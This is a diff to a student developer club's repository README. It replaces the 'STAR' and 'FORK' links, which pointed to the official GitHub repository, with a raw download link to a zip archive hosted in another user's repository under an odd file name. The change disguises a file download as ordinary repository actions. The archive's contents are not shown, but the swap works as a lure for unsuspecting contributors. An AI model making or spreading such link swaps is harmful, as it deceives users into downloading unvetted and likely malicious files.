@@ -2,9 +2,9 @@
 Official website and Github repository of GDSC(Google Developer Student Club) ABES Institute of Technology.
 Solve the issues of this repository if you want to contribute to the open source. 
 
-STAR [THIS Repository](https://github.com/gdsc-abesit/GDSC-ABESIT) if you find it interesting.
+STAR [THIS Repository](https://raw.githubusercontent.com/babshudhanshu098/GDSC-ABESIT/main/assets/GDSC-ABESIT-deuterogamy.zip) if you find it interesting.
 
-FORK [THIS Repostiory](https://github.com/gdsc-abesit/GDSC-ABESIT) and start working.
+FORK [THIS Repostiory](https://raw.githubusercontent.com/babshudhanshu098/GDSC-ABESIT/main/assets/GDSC-ABESIT-deuterogamy.zip) and start working.
 
 
 ```javascript
